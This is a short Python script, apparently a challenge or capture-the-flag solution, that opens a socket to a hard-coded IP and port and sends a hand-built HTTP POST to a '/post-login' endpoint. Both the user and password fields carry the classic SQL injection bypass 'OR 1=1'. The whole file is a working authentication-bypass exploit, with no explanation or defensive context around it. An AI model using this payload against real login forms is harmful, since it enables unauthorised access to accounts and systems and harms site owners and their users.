#!/usr/bin/env python3

import socket

HOST = '52.49.91.111'  # The server's hostname or IP address
PORT = 8326        # The port used by the server

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    s.sendall(b"""POST /post-login?goodboy HTTP/1.1
Host: 52.49.91.111:8326
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:66.0) Gecko/20100101 Firefox/66.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3
Referer: http://52.49.91.111:8326/?goodboy
Content-Type: application/x-www-form-urlencoded
Content-Length: 39
Connection: close
Cookie: auth=0c82c312c766e23720b76cd1255aa5ae
Upgrade-Insecure-Requests: 1

user=goodboy+OR+1%3D1&password=goodboy+OR+1%3D1""")
    data = s.recv(1024)

print('Received', repr(data))